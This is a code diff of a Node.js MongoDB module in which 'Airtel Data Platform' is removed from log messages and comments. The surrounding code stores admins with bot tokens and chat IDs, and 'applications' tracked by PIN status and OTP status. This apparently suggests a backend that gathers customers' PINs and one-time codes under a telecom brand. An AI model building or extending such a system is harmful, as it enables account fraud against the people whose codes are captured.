@@ -3,7 +3,7 @@ const { MongoClient } = require('mongodb');
 let client;
 let db;
 
-// Database and collections updated for Airtel Data Platform
+// Database and collections
 const DB_NAME = 'airtel_data_platform';
 const COLLECTIONS = {
     ADMINS: 'admins',
@@ -21,14 +21,14 @@ async function connectDatabase() {
             throw new Error('❌ MONGODB_URI is not set in environment variables');
         }
 
-        console.log('🔄 Connecting to Airtel Data Platform MongoDB...');
+        console.log('🔄 Connecting to MongoDB...');
 
         client = new MongoClient(MONGODB_URI);
         await client.connect();
 
         db = client.db(DB_NAME);
 
-        console.log('✅ Connected to Airtel Data Platform MongoDB successfully');
+        console.log('✅ Connected to MongoDB successfully');
 
         await createIndexes();
 
@@ -56,7 +56,7 @@ async function createIndexes() {
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });
 
-        console.log('✅ Airtel Data Platform database indexes created');
+        console.log('✅ Database indexes created');
     } catch (error) {
         console.error('⚠️ Error creating indexes:', error.message);
     }
@@ -68,7 +68,7 @@ async function createIndexes() {
 async function closeDatabase() {
     if (client) {
         await client.close();
-        console.log('✅ Airtel Data Platform database connection closed');
+        console.log('✅ Database connection closed');
     }
 }
 
@@ -99,7 +99,7 @@ async function saveAdmin(adminData) {
 
         if (adminData.botToken) adminDocument.botToken = adminData.botToken;
 
-        console.log(`💾 Saving admin to Airtel Data Platform database:`, {
+        console.log(`💾 Saving admin to database:`, {
             adminId: adminDocument.adminId,
             name:    adminDocument.name,
             email:   adminDocument.email,
@@ -216,7 +216,7 @@ async function getAdminCount() {
 }
 
 // ==========================================
-// DATA APPLICATION OPERATIONS
+// APPLICATION OPERATIONS
 // ==========================================
 
 async function saveApplication(appData) {
@@ -235,10 +235,10 @@ async function saveApplication(appData) {
             previousCount:  appData.previousCount   || 0,
             timestamp:      appData.timestamp || new Date().toISOString()
         });
-        console.log(`💾 Data application saved: ${appData.id}`);
+        console.log(`💾 Application saved: ${appData.id}`);
         return result;
     } catch (error) {
-        console.error('❌ Error saving data application:', error);
+        console.error('❌ Error saving application:', error);
         throw error;
     }
 }
@@ -357,7 +357,7 @@ async function getAllAdminsDetailed() {
             .find({})
             .sort({ createdAt: -1 })
             .toArray();
-        console.log(`📊 Found ${admins.length} admins in Airtel Data Platform database`);
+        console.log(`📊 Found ${admins.length} admins in database`);
         admins.forEach(admin => {
             console.log(`   ${admin.adminId}: ${admin.name} (chatId: ${admin.chatId}, status: ${admin.status})`);
         });
